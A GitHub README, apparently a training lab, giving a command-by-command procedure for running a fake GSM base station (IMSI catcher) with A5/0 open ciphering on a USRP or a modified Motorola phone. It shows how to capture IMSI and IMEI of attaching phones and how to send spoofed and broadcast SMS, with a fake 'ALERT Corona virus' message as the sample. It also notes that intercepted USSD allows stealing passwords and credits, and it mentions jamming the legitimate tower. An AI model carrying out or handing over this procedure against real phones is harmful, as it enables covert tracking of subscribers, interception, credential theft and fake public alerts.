# GSM_IMSICATCHER_HALFMITM_SPOOFING-SMS-WITH-PHYSICAL-MS
* [motorola](https://www.youtube.com/watch?v=ZKa86zAWmQY&pp=ygURZ3NtIHNuaWZmaW5nIDI5YzM%3D) documentation
* [spoofing](https://github.com/godfuzz3r/osmo-nitb-scripts/tree/master)
* [phddays](https://sudonull.com/post/97315-MiTM-Mobile-contest-how-they-broke-mobile-communications-at-PHDays-V-Positive-Technologies-blog)
# Half MITM = Fake BTS only
<p align="center">
  <img width="600" height="400" src="https://github.com/SitrakaResearchAndPOC/GSM_IMSICATCHER_HALFMITM_SPOOFING-SMS-WITH-PHYSICAL-MS/blob/main/2G.jpg">
</p>

# Why it is possible ?
* Fake base station with open ciphering named A5/0, and the  network could be GSM(sms, call), and GPRS, EDGE

# Attack limitations and advantages 
* local attack but could be targeting (to find local victim)
* victim could be reached on the real network (indeed call and sms)
* could be detectable with rooted phone and application like imsi-catcher detector, snoopsnitch because of open network

# Devices  
* USRP
* motorola phone (aka calypso phone on google)
* BladeRF
* LimeSDR
  
# Pratices
* Install DragonOS 29 or 30
* Create fake bts with open ciphering (A5/0)
* Add one users and modify core network for associating it with number 0341220590
* Send message from 0341220590 to 0341220590
* Send broadcast message
* Homework : Change the number 0341220590 as 0341220591

# Command you need : 
```
dmesg | grep ttyUSB*
```

# Solutions :
* Solution 1 using USRP
(more stable and no need synchronization of existing BTS so if we jam the existing BTS the half mitm still exists)
```
wget https://raw.githubusercontent.com/SitrakaResearchAndPOC/nitb-script-all/main/osmo-nitb-scripts.zip
```
```
unzip osmo-nitb-scripts.zip
```
```
cd osmo-nitb-scripts
```
Database is at : /var/lib/osmocom/hlr.sqlite3  
Installing all config  
```
bash install_services.sh
```
Running the transceiver
```
osmo-trx-uhd -C /etc/osmocom/osmo-trx-uhd.cfg
```
Running main_uhd_spoof associate with configs/openbsc_spoof.cfg
ctrl+shift+T
```
cd osmo-nitb-scripts
```
```
python3 main_uhd_spoof.py
```
ctrl+shift+T
```
cd osmo-nitb-scripts/scripts_spoof1
```
Tape `*#*#4636#*#*` and choose GSM only on your Android phone  
Search GSM network (on your phone), associate with PLMN MCC 001 && MNC 01  
Tape *#001# for finding your phone number (extension with osmo-bts)   
```
bash finding_imsi_extenstion.sh
```
You could find imsi and extension  
let's see for example imsi as 646040222463674 and extension as 126
```
bash set_imsi_extension.sh 646040222463674 0341220590
```
Verify by if the association is correct
let's see for example imsi as 646040222463674 and extension as 0341220590
```
bash finding_imsi_extenstion.sh
```
```
python2 sending_sms_spoof_byextension.py
```
Sending for all extensions in osmo-bts
```
python2 sending_sms_broadcast.py 
```
log should be :  subscriber extension 0341220590 sms sender extension 0341220590 send ALERT Corona virus  

* Solution 1debug using USRP with manual and debug mode
```
wget https://raw.githubusercontent.com/SitrakaResearchAndPOC/nitb-script-all/main/osmo-nitb-scripts.zip
```
```
unzip osmo-nitb-scripts.zip
```
```
cd osmo-nitb-scripts
```
```
bash install_services.sh
```
Running the transceiver
```
osmo-trx-uhd -C /etc/osmocom/osmo-trx-uhd.cfg
```
ADDING DEBUG MODE OPTIONS :  --debug=DRLL:DCC:DMM:DRR:DRSL:DNM  
Database at : /var/lib/osmocom/hlr.sqlite3 
```
/usr/local/bin/osmo-nitb --yes-i-really-want-to-run-prehistoric-software -s -C -c /etc/osmocom2/osmo-nitb.cfg -l /var/lib/osmocom/hlr.sqlite3  --debug=DRLL:DCC:DMM:DRR:DRSL:DNM
```
Launching the bts on debug mode
ADDING DEBUG MODE OPTIONS : --debug DRSL:DOML:DLAPDM
```
/usr/local/bin/osmo-bts-trx -s -c /etc/osmocom2/osmo-bts-trx.cfg --debug DRSL:DOML:DLAPDM
```
Have a look on the terminal at the command : /usr/local/bin/osmo-nitb --yes-i-really-want-to-run-prehistoric-software -s -C -c /etc/osmocom2/osmo-nitb.cfg -l /var/lib/osmocom/hlr.sqlite3  --debug=DRLL:DCC:DMM:DRR:DRSL:DNM  


  
Tape *#*#4636#*#* and choose GSM only on your Android phone  
Search GSM network (on your phone), associate with PLMN MCC 001 && MNC 01  
Have a look on log for capturing IMSI and IMEI  

  
Tape *#001# for finding your phone number (extension with osmo-bts)   
Have a look on the log about USSD: Own number requested  

  
Tape USSD *100*123#
Have a look on log of USSB : Unhandled USSD  (possible to steal password and credits)
  

ctrl+shift+T
```
cd osmo-nitb-scripts/scripts_spoof1
```
```
bash finding_imsi_extenstion.sh
```
You could find imsi and extension  
let's see for example imsi as 646040222463674 and extension as 126
```
bash set_imsi_extension.sh 646040222463674 0341220590
```
Verify by if the association is correct
let's see for example imsi as 646040222463674 and extension as 0341220590
```
bash finding_imsi_extenstion.sh
```
```
python2 sending_sms_spoof_byextension.py
```
Sending for all extensions in osmo-bts
```
python2 sending_sms_broadcast.py 
```
log should be :  subscriber extension 0341220590 sms sender extension 0341220590 send ALERT Corona virus  

  
* Solution 2 : using one motorola phone  
(Not so stable and  need synchronization of existing BTS by finding arfcn of synchronization so if we jam the existing BTS the half mitm doesn't exist anymore)

Hardware setup 1 : Need battery and not programmable with arduino  

[serial_cable](https://osmocom.org/projects/baseband/wiki/Serial_Cable)    [smartspate](https://www.smartspate.com/how-to-create-2g-network-at-your-own-home/)   [sudonull](https://sudonull.com/post/69473-Launching-a-GSM-network-at-home-Pentestit-Blog)
<p align="center">
  <img width="600" height="400" src="https://github.com/SitrakaResearchAndPOC/GSM_IMSICATCHER_HALFMITM_SPOOFING-SMS-WITH-PHYSICAL-MS/blob/main/usb_motorola.jpg">
</p>

<p align="center">
  <img width="600" height="400" src="https://github.com/SitrakaResearchAndPOC/GSM_IMSICATCHER_HALFMITM_SPOOFING-SMS-WITH-PHYSICAL-MS/blob/main/usb_cable_final.png">
</p>


Hardware setup 2 : No need battery and programmable with arduino  
<p align="center">
  <img width="600" height="400" src="https://github.com/SitrakaResearchAndPOC/GSM_IMSICATCHER_HALFMITM_SPOOFING-SMS-WITH-PHYSICAL-MS/blob/main/USB_TTL.jpg">
</p>



```
wget https://raw.githubusercontent.com/SitrakaResearchAndPOC/nitb-script-all/main/osmo-nitb-scripts-calypsobts.zip
```
```
unzip osmo-nitb-scripts-calypsobts.zip 
```
```
cd osmo-nitb-scripts-calypsobts
```
Tape *#*#4636#*#* and choose GSM only on your Android phone  
Installing network signal guru on your android phone  
And finding the arfcn that this one is connect  
Let's name this arfcn as 975  
Configure arfcn at service/osmotrx.lms as 975
```
gedit service/osmotrx.lms
```
Save the configuration
```
bash install_services.sh 
```
```
bash trx.sh
```
Click button power of motorola phone  
Tape ctrl+shift+T
```
cd osmo-nitb-scripts-calypsobts
```
```
python3 main_spoof.py
```
ctrl+shift+T
```
cd osmo-nitb-scripts-calypsobts/scripts_spoof1
```
```
bash finding_imsi_extenstion.sh
```
You could find imsi and extension  
let's see for example imsi as 646040222463674 and extension as 126
```
bash set_imsi_extension.sh 646040222463674 0341220590
```
Verify by if the association is correct
let's see for example imsi as 646040222463674 and extension as 0341220590
```
bash finding_imsi_extenstion.sh
```
Tape *#*#4636#*#* and choose GSM only on your Android phone  
Search GSM network (on your phone), associate with PLMN MCC 001 && MNC 01  
Tape *#001# for finding your phone number (extension with osmo-bts)   
```
python2 sending_sms_spoof_byextension.py
```
Sending for all extensions in osmo-bts
```
python2 sending_sms_broadcast.py 
```
log should be :  subscriber extension 0341220590 sms sender extension 0341220590 send ALERT Corona virus  

Solution 2debug : using one motorola phone, manual script on debug mode
```
wget https://raw.githubusercontent.com/SitrakaResearchAndPOC/nitb-script-all/main/osmo-nitb-scripts-calypsobts.zip
```
```
unzip osmo-nitb-scripts-calypsobts.zip 
```
```
cd osmo-nitb-scripts-calypsobts
```
Tape *#*#4636#*#* and choose GSM only on your Android phone  
Installing network signal guru on your android phone  
And finding the arfcn that this one is connect  
Let's name this arfcn as 975  
Configure arfcn at service/osmotrx.lms as 975
```
gedit service/osmotrx.lms
```
Save the configuration
```
bash install_services.sh 
```
```
bash trx.sh
```
Click button power of motorola phone  
Tape ctrl+shift+T  
Launching osmo-nitb  with debug mode --debug=DRLL:DCC:DMM:DRR:DRSL:DNM
Database at : /usr/src/CalypsoBTS/hlr.sqlite3
```
osmo-nitb --yes-i-really-want-to-run-prehistoric-software -c /usr/src/CalypsoBTS/openbsc.cfg -l /usr/src/CalypsoBTS/hlr.sqlite3 -P -C --debug=DRLL:DCC:DMM:DRR:DRSL:DNM
```
Launching osmo-bts  with debug mode option : --debug DRSL:DOML:DLAPDM
```
osmo-bts-trx -c /usr/src/CalypsoBTS/osmo-bts-trx-calypso.cfg --debug DRSL:DOML:DLAPDM -r 99
```

Have a look on the terminal at the command : /usr/local/bin/osmo-nitb --yes-i-really-want-to-run-prehistoric-software -s -C -c /etc/osmocom2/osmo-nitb.cfg -l /var/lib/osmocom/hlr.sqlite3  --debug=DRLL:DCC:DMM:DRR:DRSL:DNM  


  
Tape *#*#4636#*#* and choose GSM only on your Android phone  
Search GSM network (on your phone), associate with PLMN MCC 001 && MNC 01  
Have a look on log for capturing IMSI and IMEI  

  
Tape *#001# for finding your phone number (extension with osmo-bts)   
Have a look on the log about USSD: Own number requested  

  
Tape USSD *100*123#
Have a look on log of USSB : Unhandled USSD  (possible to steal password and credits)
  

ctrl+shift+T
```
cd osmo-nitb-scripts/scripts_spoof1
```
```
bash finding_imsi_extenstion.sh
```
You could find imsi and extension  
let's see for example imsi as 646040222463674 and extension as 126
```
bash set_imsi_extension.sh 646040222463674 0341220590
```
Verify by if the association is correct
let's see for example imsi as 646040222463674 and extension as 0341220590
```
bash finding_imsi_extenstion.sh
```
```
python2 sending_sms_spoof_byextension.py
```
Sending for all extensions in osmo-bts
```
python2 sending_sms_broadcast.py 
```
log should be :  subscriber extension 0341220590 sms sender extension 0341220590 send ALERT Corona virus  


* Remark : 
Don't use this delete_all.sh script after running BTS, the best is before running a bts  
```
bash delete_all.sh
```
The extension 0341220590 should exist as a mobile phone on the GSM network







